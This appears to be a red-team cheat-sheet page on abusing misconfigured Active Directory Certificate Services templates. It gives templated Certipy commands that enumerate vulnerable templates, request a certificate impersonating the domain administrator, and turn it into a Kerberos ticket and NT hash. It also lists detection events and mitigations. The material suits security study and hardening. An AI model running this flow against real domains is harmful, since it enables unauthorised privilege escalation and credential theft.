---
title: ADCS overview
category: AD / ADCS
order: 10
tags: [adcs, certipy, pkinit, esc, certificates]
summary: >
  A certificate is an authentication credential. If a low-priv principal can get
  a cert that names (or maps to) a higher-priv identity, they can PKINIT to a TGT
  as that identity. certipy find -vulnerable enumerates the ESC misconfigs.
prerequisites:
  - Any domain account for enumeration ($user / $password)
  - An Enterprise CA in the domain and a reachable DC ($dc_ip)
tools: [Certipy, Certify, bloodyAD, netexec]
detection:
  - CA events 4886/4887 (request/issue) with SAN ≠ requester; 4890 (CA config change)
  - Certificate authentications (4768 with certificate) for accounts that shouldn't use them
mitigation:
  - Enforce strong certificate mapping (KB5014754, StrongCertificateBindingEnforcement=2)
  - Remove ENROLLEE_SUPPLIES_SUBJECT + broad enroll ACLs; enable EPA on web enrollment
refs:
  - { label: "SpecterOps — Certified Pre-Owned", url: "https://specterops.io/blog/2021/06/17/certified-pre-owned/" }
  - { label: "Certipy wiki", url: "https://github.com/ly4k/Certipy/wiki" }
  - { label: "The Hacker Recipes — ADCS", url: "https://www.thehacker.recipes/ad/movement/adcs" }
---

## How ESC abuse works

1. You hold **enroll rights** on a template (or a relay/coercion primitive).
2. A template or CA **misconfiguration** lets the issued certificate **name or
   map to** a higher-priv identity (arbitrary SAN, no SID extension, weak
   mapping, injected application policy…).
3. You **request** the certificate, then **authenticate** with it via PKINIT
   (Kerberos) or Schannel → a TGT / access as that identity, often up to
   Domain/Enterprise Admin.

## Enumerate

```sh
# find vulnerable templates, CAs, and misconfigs (feeds BloodHound too)
certipy find -u $user@$domain -p $password -dc-ip $dc_ip -stdout -vulnerable
certipy find -u $user@$domain -p $password -dc-ip $dc_ip -bloodhound
```

## Request + authenticate (the generic flow)

```sh
# request a cert (ESC1-style: attacker-chosen SAN + SID)
certipy req -u $user@$domain -p $password -dc-ip $dc_ip \
  -target $ca_host -ca $ca -template $template \
  -upn $target_user@$domain -sid $domain_sid-500
# authenticate with the PFX -> TGT + NT hash
certipy auth -pfx $target_user.pfx -dc-ip $dc_ip
```

## The KB5014754 caveat

Microsoft's May 2022 patch adds a **SID security extension** to certs and
(eventually) enforces **strong mapping**. Post-patch, SAN-only impersonation
needs a matching `-sid`, or a technique that removes/ignores the SID extension
(**ESC9 / ESC10 / ESC16**) or abuses explicit mappings (**ESC14**).

> See the **ESC catalog** for all 16 techniques with their exact preconditions.
